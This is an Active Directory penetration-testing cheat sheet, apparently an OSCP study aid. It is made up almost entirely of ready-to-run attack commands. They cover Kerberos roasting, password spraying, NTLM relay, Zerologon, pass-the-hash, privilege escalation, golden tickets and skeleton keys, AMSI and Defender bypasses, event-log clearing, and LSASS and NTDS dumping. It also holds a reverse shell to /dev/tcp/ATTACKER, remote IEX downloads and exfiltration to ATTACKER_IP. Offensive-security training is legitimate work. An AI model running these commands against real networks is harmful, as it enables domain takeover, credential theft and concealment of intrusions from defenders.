╔══════════════════════════════════════════════════════════════════════════════════╗
║                     COMPLETE AD PENETRATION TESTING CHEATSHEET                  ║
║                     WITH ALL COMMANDS AND TECHNIQUES                           ║
╚══════════════════════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════════════════════╗
║                           INITIAL ENUMERATION COMMANDS                          ║
╚══════════════════════════════════════════════════════════════════════════════════╝

│ PORT SCANNING:                                                                    │
│   nmap -sC -sV -p- -oA full_scan 10.10.10.10                                      │
│   nmap -p 88,389,445,636,3268,3269,5985,53,135,139 -sV 10.10.10.10               │
│                                                                                   │
│ SMB ENUMERATION:                                                                  │
│   smbclient -L //10.10.10.10 -N                                                   │
│   smbmap -H 10.10.10.10 -u '' -p ''                                               │
│   netexec smb 10.10.10.10 --shares --users                                        │
│   enum4linux -a 10.10.10.10                                                       │
│                                                                                   │
│ LDAP ENUMERATION:                                                                 │
│   ldapsearch -x -H ldap://10.10.10.10 -b "" -s base namingContexts                │
│   ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" │
│   ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=computer)" │
│                                                                                   │
│ KERBEROS ENUMERATION:                                                             │
│   GetNPUsers.py domain.local/ -no-pass -dc-ip 10.10.10.10                         │
│   GetUserSPNs.py domain.local/ -no-pass -dc-ip 10.10.10.10                        │
│   GetADUsers.py -all -dc-ip 10.10.10.10 domain.local/                             │
│                                                                                   │
│ DNS ENUMERATION:                                                                  │
│   dig axfr @10.10.10.10 domain.local                                              │
│   nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local 10.10.10.10                │
│   dnsrecon -d domain.local -t axfr -n 10.10.10.10                                 │
╠══════════════════════════════════════════════════════════════════════════════════╣
║                     INITIAL ACCESS/NO CREDENTIALS ATTACKS                       ║
╚══════════════════════════════════════════════════════════════════════════════════╝

│ AS-REP ROASTING:                                                                  │
│   GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass    │
│   Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt                       │
│   Hashcat: hashcat -m 18200 hashes.txt rockyou.txt --force                        │
│                                                                                   │
│ KERBEROASTING (requires user list):                                               │
│   GetUserSPNs.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10            │
│   Rubeus.exe kerberoast /outfile:hashes.txt                                       │
│   Hashcat: hashcat -m 13100 hashes.txt rockyou.txt --force                        │
│                                                                                   │
│ PASSWORD SPRAYING:                                                                │
│   netexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success     │
│   netexec winrm 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success   │
│   crackmapexec ldap 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success │
│                                                                                   │
│ LLMNR/NBT-NS POISONING:                                                           │
│   responder -I eth0 -w -F                                                         │
│   After hash capture: hashcat -m 5600 hash.txt rockyou.txt                        │
│                                                                                   │
│ SMB RELAY:                                                                        │
│   ntlmrelayx.py -t smb://10.10.10.20 -smb2support                                 │
│   ntlmrelayx.py -t ldap://10.10.10.10 --add-computer                              │
│                                                                                   │
│ ZERO LOGON (CVE-2020-1472):                                                       │
│   python3 zerologon.py DC01 10.10.10.10                                           │
│   secretsdump.py -just-dc -no-pass DC01\$@10.10.10.10                             │
╠══════════════════════════════════════════════════════════════════════════════════╣
║                     POST-COMPROMISE WITH USER CREDENTIALS                       ║
╚══════════════════════════════════════════════════════════════════════════════════╝

│ BLOODHOUND DATA COLLECTION:                                                       │
│   bloodhound-python -d domain.local -u user -p 'Password123' -c All -ns 10.10.10.10 │
│   SharpHound.exe -c All --zipfilename bh_data.zip                                 │
│                                                                                   │
│ POWERSHELL ENUMERATION:                                                           │
│   powershell -ep bypass                                                            │
│   Import-Module .\PowerView.ps1                                                    │
│   Get-DomainUser | Select-Object samaccountname                                    │
│   Get-DomainComputer | Select-Object name, operatingsystem                        │
│   Get-DomainGroup -Identity "Domain Admins" | Select-Object member                 │
│                                                                                   │
│ KERBEROS TICKET MANAGEMENT:                                                       │
│   # Request TGT:                                                                  │
│   Rubeus.exe asktgt /user:USER /domain:domain.local /rc4:NTLM_HASH /ptt          │
│   Rubeus.exe asktgt /user:USER /domain:domain.local /aes256:AES256_HASH /ptt     │
│                                                                                   │
│   # Request TGS for SPN:                                                          │
│   Rubeus.exe asktgs /ticket:TGT.kirbi /service:cifs/dc01.domain.local /ptt       │
│                                                                                   │
│   # Pass the Ticket:                                                              │
│   export KRB5CCNAME=/path/to/ticket.ccache                                        │
│   impacket-psexec domain.local/user@dc01 -k -no-pass                              │
│                                                                                   │
│   # Dump tickets from memory:                                                     │
│   Rubeus.exe dump /nowrap                                                         │
│   mimikatz # sekurlsa::tickets /export                                            │
│                                                                                   │
│ LATERAL MOVEMENT:                                                                 │
│   # Pass the Hash:                                                                │
│   netexec smb 10.10.10.20 -u Administrator -H NTLM_HASH                           │
│   impacket-wmiexec -hashes :NTLM_HASH domain.local/user@10.10.10.20               │
│                                                                                   │
│   # Pass the Ticket (Linux):                                                      │
│   export KRB5CCNAME=ticket.ccache                                                 │
│   impacket-psexec domain.local/user@10.10.10.20 -k -no-pass                       │
│                                                                                   │
│   # WinRM:                                                                        │
│   evil-winrm -i 10.10.10.20 -u user -p 'Password123'                              │
│   evil-winrm -i 10.10.10.20 -u user -H NTLM_HASH                                  │
│                                                                                   │
│   # RDP:                                                                          │
│   xfreerdp /v:10.10.10.20 /u:user /p:'Password123' /dynamic-resolution            │
│   xfreerdp /v:10.10.10.20 /u:user /pth:NTLM_HASH                                  │
│                                                                                   │
│   # Scheduled Task:                                                               │
│   schtasks /create /s 10.10.10.20 /u user /p 'Password123' /tn backdoor /tr "cmd.exe" │
│   /sc once /st 00:00                                                              │
│                                                                                   │
│   # Service Creation:                                                             │
│   sc \\10.10.10.20 create backdoor binPath= "cmd.exe /c whoami"                   │
│   sc \\10.10.10.20 start backdoor                                                 │
╠══════════════════════════════════════════════════════════════════════════════════╣
║                            PRIVILEGE ESCALATION                                  ║
╚══════════════════════════════════════════════════════════════════════════════════╝

│ WINDOWS LOCAL PRIVESC:                                                            │
│   # Check privileges:                                                             │
│   whoami /priv                                                                    │
│   whoami /groups                                                                  │
│                                                                                   │
│   # Potato exploits (SeImpersonate/SeAssignPrimaryToken):                         │
│   JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami" -l 1337      │
│   RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999                             │
│   PrintSpoofer.exe -c "cmd.exe"                                                   │
│                                                                                   │
│   # Service abuse:                                                                │
│   sc config VulnService binPath= "cmd.exe /c net user hacker Password123! /add"   │
│   sc stop VulnService && sc start VulnService                                     │
│                                                                                   │
│   # Unquoted service path:                                                        │
│   icacls "C:\Program Files\Vulnerable\"                                           │
│   copy C:\Windows\System32\cmd.exe "C:\Program.exe"                               │
│                                                                                   │
│   # AlwaysInstallElevated:                                                        │
│   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated │
│   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o setup.msi │
│   msiexec /quiet /qn /i setup.msi                                                 │
│                                                                                   │
│   # DLL Hijacking:                                                                │
│   procmon.exe (look for DLLs loaded from writable directories)                    │
│   Place malicious.dll in C:\Temp\                                                 │
│                                                                                   │
│ LINUX LOCAL PRIVESC:                                                              │
│   # SUID binaries:                                                                │
│   find / -perm -4000 -type f 2>/dev/null                                          │
│   find / -perm -u=s -type f 2>/dev/null                                           │
│                                                                                   │
│   # Sudo privileges:                                                              │
│   sudo -l                                                                         │
│   sudo find /etc/passwd -exec /bin/bash \;                                        │
│   sudo vi -c ':!bash'                                                             │
│                                                                                   │
│   # Capabilities:                                                                 │
│   getcap -r / 2>/dev/null                                                         │
│   python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'                   │
│                                                                                   │
│   # Cron jobs:                                                                    │
│   crontab -l                                                                      │
│   ls -la /etc/cron*                                                               │
│   echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /path/to/cron/script.sh        │
│                                                                                   │
│ DOMAIN PRIVESC - ACL ABUSES:                                                      │
│   # Check ACLs:                                                                   │
│   Get-DomainObjectAcl -Identity "Domain Admins" | ?{$_.SecurityIdentifier -match "S-1-5-21"} | Select SecurityIdentifier,ActiveDirectoryRights │
│                                                                                   │
│   # GenericAll on user:                                                           │
│   Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force) │
│                                                                                   │
│   # GenericAll on group:                                                          │
│   Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker' -Verbose    │
│                                                                                   │
│   # WriteDACL on domain:                                                          │
│   Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync │
│                                                                                   │
│   # WriteOwner on object:                                                         │
│   Set-DomainObjectOwner -Identity TargetObject -OwnerIdentity attacker            │
│   Add-DomainObjectAcl -TargetIdentity TargetObject -PrincipalIdentity attacker -Rights ResetPassword │
│                                                                                   │
│ DOMAIN PRIVESC - DELEGATION:                                                      │
│   # Unconstrained delegation:                                                     │
│   Get-DomainComputer -Unconstrained | Select-Object Name                          │
│   Rubeus.exe monitor /interval:5 /filteruser:DC01$                                │
│   Rubeus.exe dump /service:krbtgt /nowrap                                         │
│                                                                                   │
│   # Constrained delegation:                                                       │
│   Get-DomainUser -TrustedToAuth | Select-Object samaccountname                    │
│   Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local /ptt │
│                                                                                   │
│   # Resource-based constrained delegation:                                        │
│   Get-DomainComputer -Identity TARGET | Select-Object msDS-AllowedToActOnBehalfOfOtherIdentity │
│   New-MachineAccount -MachineAccount FAKECOMPUTER -Domain domain.local -DomainController dc01.domain.local │
│   Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=@('FAKECOMPUTER$')} │
│   Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /ptt │
│                                                                                   │
│ DOMAIN PRIVESC - DCSYNC:                                                          │
│   # Check for DCSync rights:                                                      │
│   Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} │
│                                                                                   │
│   # Perform DCSync:                                                               │
│   impacket-secretsdump domain.local/user:Password123@dc01                         │
│   mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt                    │
│                                                                                   │
│ DOMAIN PRIVESC - AD CS ATTACKS:                                                   │
│   # Find vulnerable templates:                                                    │
│   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.10           │
│                                                                                   │
│   # ESC1 (ENROLLEE_SUPPLIES_SUBJECT):                                             │
│   certipy req -u user@domain.local -p 'Password123' -ca CA-NAME -target dc01.domain.local -template VULN-TEMPLATE -upn Administrator@domain.local │
│   certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10                          │
│                                                                                   │
│   # ESC8 (NTLM Relay to AD CS HTTP):                                              │
│   ntlmrelayx.py -t http://dc01.domain.local/certsrv/certfnsh.asp --adcs --template DomainController │
│   python3 PetitPotam.py -d domain.local -u user -p 'Password123' ATTACKER_IP dc01.domain.local │
│                                                                                   │
│ DOMAIN PRIVESC - DNSADMINS:                                                       │
│   dnscmd dc01 /config /serverlevelplugindll \\ATTACKER\share\malicious.dll        │
│   sc stop dns && sc start dns                                                     │
╠══════════════════════════════════════════════════════════════════════════════════╣
║                            PERSISTENCE TECHNIQUES                               ║
╚══════════════════════════════════════════════════════════════════════════════════╝

│ GOLDEN TICKET:                                                                    │
│   # Get krbtgt hash:                                                              │
│   impacket-secretsdump domain.local/Administrator:Password123@dc01                │
│                                                                                   │
│   # Create golden ticket:                                                         │
│   ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator -duration 5256000 │
│   mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:SID /krbtgt:KRBTGT_HASH /ptt │
│                                                                                   │
│   # Use golden ticket:                                                            │
│   export KRB5CCNAME=Administrator.ccache                                          │
│   impacket-psexec domain.local/Administrator@dc01 -k -no-pass                     │
│                                                                                   │
│ SILVER TICKET:                                                                    │
│   # Get service account hash:                                                     │
│   mimikatz # sekurlsa::logonpasswords                                            │
│                                                                                   │
│   # Create silver ticket:                                                         │
│   kerberos::golden /user:Administrator /domain:domain.local /sid:SID /target:dc01.domain.local /service:cifs /rc4:SERVICE_HASH /ptt │
│                                                                                   │
│ SID HISTORY INJECTION:                                                            │
│   mimikatz # sid::patch                                                           │
│   mimikatz # sid::add /sam:attacker /new:Administrator                            │
│                                                                                   │
│ SKELETON KEY:                                                                     │
│   mimikatz # misc::skeleton                                                       │
│   # Now all users can authenticate with password "mimikatz"                       │
│                                                                                   │
│ DSRM PERSISTENCE:                                                                 │
│   # Change DSRM password:                                                         │
│   ntdsutil "set dsrm password" "reset password on server null" q q                │
│                                                                                   │
│   # Enable DSRM logon:                                                            │
│   reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f │
│                                                                                   │
│   # Logon with DSRM:                                                              │
│   psexec.exe -s \\dc01 cmd.exe                                                    │
│                                                                                   │
│ SSP PERSISTENCE:                                                                  │
│   # Install Mimikatz SSP:                                                         │
│   mimikatz # misc::memssp                                                        │
│                                                                                   │
│   # Install custom SSP:                                                           │
│   copy mimilib.dll C:\Windows\System32\                                           │
│   reg add "HKLM\System\CurrentControlSet\Control\Lsa\" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f │
│                                                                                   │
│ SCHEDULED TASK PERSISTENCE:                                                       │
│   schtasks /create /tn "SystemCheck" /tr "cmd.exe /c whoami" /sc hourly /mo 1 /ru SYSTEM │
│   schtasks /run /tn "SystemCheck"                                                │
│                                                                                   │
│ SERVICE PERSISTENCE:                                                              │
│   sc create PersistService binPath= "cmd.exe /c whoami" start= auto               │
│   sc start PersistService                                                         │
│                                                                                   │
│ REGISTRY PERSISTENCE:                                                             │
│   reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f │
│                                                                                   │
│ WMI EVENT SUBSCRIPTION:                                                           │
│   $FilterArgs = @{name='BackdoorFilter'; EventNameSpace='root\cimv2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"} │
│   $Filter=Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs │
│   $ConsumerArgs = @{name='BackdoorConsumer'; CommandLineTemplate='cmd.exe /c whoami > C:\Windows\Temp\backdoor.txt'} │
│   $Consumer=Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs │
│   $BindingArgs = @{Filter=$Filter; Consumer=$Consumer}                            │
│   $Binding=Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs │
╠══════════════════════════════════════════════════════════════════════════════════╣
║                            DEFENSE EVASION                                      ║
╚══════════════════════════════════════════════════════════════════════════════════╝

│ AMSI BYPASS:                                                                      │
│   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) │
│   powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File script.ps1 │
│                                                                                   │
│ POWERSHELL LOGGING BYPASS:                                                        │
│   reg add "HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f │
│                                                                                   │
│ EVENT LOG CLEARING:                                                               │
│   wevtutil cl Security                                                            │
│   wevtutil cl System                                                              │
│   wevtutil cl Application                                                         │
│   Clear-EventLog -LogName Security, Application, System                           │
│                                                                                   │
│ ETW PATCHING:                                                                     │
│   [Reflection.Assembly]::LoadWithPartialName('System.Core')                       │
│   $etwProvider = [System.Diagnostics.Eventing.EventProvider]::new('Microsoft-Windows-Kernel-Processor-Power') │
│   $etwProvider.SetInformation(18, [byte[]]@(0x00, 0x00))                          │
│                                                                                   │
│ DEFENDER DISABLE:                                                                 │
│   Set-MpPreference -DisableRealtimeMonitoring $true                               │
│   reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f │
│                                                                                   │
│ FIREWALL DISABLE:                                                                 │
│   netsh advfirewall set allprofiles state off                                     │
│   Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False            │
│                                                                                   │
│ UAC BYPASS:                                                                       │
│   Event Viewer -> "Open Saved Log" -> "C:\Windows\System32\cmd.exe"               │
│   fodhelper.exe (registry hijack)                                                 │
│                                                                                   │
│ APP LOCKER BYPASS:                                                                │
│   powershell.exe -ExecutionPolicy Bypass -File script.ps1                         │
│   InstallUtil.exe /logfile= /LogToConsole=false /U script.cs                      │
│   regsvr32.exe /s /n /u /i:http://ATTACKER/script.sct scrobj.dll                  │
╠══════════════════════════════════════════════════════════════════════════════════╣
║                            DATA EXFILTRATION                                    ║
╚══════════════════════════════════════════════════════════════════════════════════╝

│ LSASS DUMP:                                                                       │
│   task manager -> lsass.exe -> Create dump file                                   │
│   procdump.exe -accepteula -ma lsass.exe lsass.dmp                                │
│   mimikatz # sekurlsa::minidump lsass.dmp                                        │
│   mimikatz # sekurlsa::logonpasswords                                            │
│                                                                                   │
│ NTDS.DIT EXTRACTION:                                                              │
│   ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q                       │
│   robocopy C:\Temp\ntds\Active\ Domain\ C:\Temp\ntds.dit ntds.dit                 │
│                                                                                   │
│ REGISTRY HIVE EXTRACTION:                                                         │
│   reg save HKLM\SYSTEM system.hive                                                │
│   reg save HKLM\SAM sam.hive                                                      │
│   reg save HKLM\SECURITY security.hive                                            │
│                                                                                   │
│ DPAPI EXTRACTION:                                                                 │
│   mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\* │
│   mimikatz # vault::cred                                                          │
│                                                                                   │
│ BROWSER CREDENTIALS:                                                              │
│   LaZagne.exe browsers                                                            │
│   mimikatz # vault::list                                                          │
│                                                                                   │
│ FILE SEARCH FOR SENSITIVE DATA:                                                   │
│   findstr /si password *.txt *.xml *.config *.ini                                 │
│   grep -r "password" /home/ --include="*.txt" --include="*.config"                │
│                                                                                   │
│ EXFILTRATION METHODS:                                                             │
│   # HTTP:                                                                         │
│   certutil -urlcache -split -f http://ATTACKER/file.exe C:\Windows\Temp\file.exe  │
│   powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file.exe', 'file.exe')" │
│                                                                                   │
│   # SMB:                                                                          │
│   copy secrets.txt \\ATTACKER\share\                                              │
│                                                                                   │
│   # FTP:                                                                          │
│   echo open ATTACKER_IP > ftp.txt                                                 │
│   echo USER anonymous >> ftp.txt                                                  │
│   echo PASS anonymous >> ftp.txt                                                  │
│   echo binary >> ftp.txt                                                          │
│   echo put file.txt >> ftp.txt                                                    │
│   echo bye >> ftp.txt                                                             │
│   ftp -s:ftp.txt                                                                  │
│                                                                                   │
│   # DNS:                                                                          │
│   dnscat2 (for command channel)                                                   │
│   for /l %i in (1,1,100) do @(nslookup data%i.domain.com)                         │
│                                                                                   │
│   # ICMP:                                                                         │
│   ping -n 1 -l 1000 ATTACKER_IP (data in ICMP payload)                            │
╠══════════════════════════════════════════════════════════════════════════════════╣
║                            TOOLS INSTALLATION                                   ║
╚══════════════════════════════════════════════════════════════════════════════════╝

│ KALI TOOLS:                                                                       │
│   sudo apt update && sudo apt upgrade -y                                          │
│   sudo apt install -y impacket-scripts bloodhound-python crackmapexec responder hashcat seclists │
│   pip3 install --upgrade impacket                                                 │
│   pip3 install bloodhound                                                         │
│   pip3 install certipy-ad                                                         │
│   pip3 install ldapdomaindump                                                     │
│                                                                                   │
│ WINDOWS TOOLS DOWNLOAD:                                                           │
│   # From Kali to Windows:                                                         │
│   impacket-smbserver share . -smb2support                                         │
│   # Then on Windows:                                                              │
│   copy \\ATTACKER\share\tool.exe C:\Windows\Temp\                                 │
│                                                                                   │
│   # PowerShell download:                                                          │
│   IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')   │
│   IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1') │
│                                                                                   │
│ ESSENTIAL TOOLS LIST:                                                             │
│   - Impacket (secretsdump, psexec, smbserver, etc.)                               │
│   - BloodHound & SharpHound                                                       │
│   - PowerView.ps1                                                                 │
│   - Rubeus.exe                                                                    │
│   - Mimikatz.exe                                                                  │
│   - WinPEAS.exe / LinPEAS.sh                                                      │
│   - Seatbelt.exe                                                                  │
│   - JuicyPotato/PrintSpoofer                                                      │
│   - Certipy                                                                       │
│   - Responder                                                                     │
│   - Hashcat                                                                       │
│   - John the Ripper                                                               │
│   - Evil-WinRM                                                                    │
│   - CrackMapExec (netexec)                                                        │
│   - Chisel (tunneling)                                                            │
│   - Procdump                                                                      │
│   - LaZagne                                                                       │
╠══════════════════════════════════════════════════════════════════════════════════╣
║                            QUICK REFERENCE                                       ║
╚══════════════════════════════════════════════════════════════════════════════════╝

│ TICKET FORMATS:                                                                   │
│   .ccache - Used by Linux/Impacket tools                                          │
│   .kirbi - Used by Windows/Rubeus/Mimikatz                                        │
│   Base64 - Can be used by Rubeus with /ticket:<base64>                            │
│                                                                                   │
│   Convert .ccache to .kirbi:                                                      │
│     kekeo # kerberos::clist "ticket.ccache" /export                              │
│                                                                                   │
│   Convert .kirbi to .ccache:                                                      │
│     kirbi2ccache.py ticket.kirbi ticket.ccache                                    │
│                                                                                   │
│ HASH FORMATS:                                                                     │
│   NTLM: aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889        │
│   AES256: 8a2e... (64 chars)                                                     │
│   Kerberos AS-REP: $krb5asrep$23$... (hashcat mode 18200)                         │
│   Kerberos TGS-REP: $krb5tgs$23$... (hashcat mode 13100)                          │
│                                                                                   │
│ COMMON PORTS:                                                                     │
│   53 - DNS                                                                        │
│   88 - Kerberos                                                                   │
│   135 - RPC                                                                       │
│   139 - NetBIOS                                                                   │
│   389 - LDAP                                                                      │
│   445 - SMB                                                                       │
│   464 - Kerberos Password Change                                                  │
│   636 - LDAPS                                                                     │
│   3268 - Global Catalog                                                           │
│   3269 - Global Catalog over SSL                                                  │
│   5985 - WinRM HTTP                                                               │
│   5986 - WinRM HTTPS                                                              │
│                                                                                   │
│ COMMON PASSWORDS FOR SPRAYING:                                                    │
│   Password123, Welcome1, Spring2024!, Company2024!, P@ssw0rd, Winter2024!,        │
│   Summer2024!, Fall2024!, Changeme123, Admin123!, Password1, Password, admin     │
│                                                                                   │
│ OSCP EXAM TIPS:                                                                   │
│   1. Always screenshot EVERYTHING                                                 │
│   2. Document IPs, usernames, passwords                                           │
│   3. Follow the methodology: Enumeration -> Initial Access -> Post-compromise ->  │
│      Privilege Escalation -> Persistence                                          │
│   4. Time management: 4-hour boxes = 1 hour enumeration, 2 hours exploitation,    │
│      1 hour documentation                                                         │
│   5. BloodHound is your best friend                                               │
│   6. Try password spraying early                                                   │
│   7. Check for AS-REP roasting first                                              │
│   8. Always check SMB anonymous access                                            │
│   9. Upload winPEAS/LinPEAS immediately after shell                               │
│   10. Don't overcomplicate - OSCP is about basics done right                     │
╚══════════════════════════════════════════════════════════════════════════════════╝
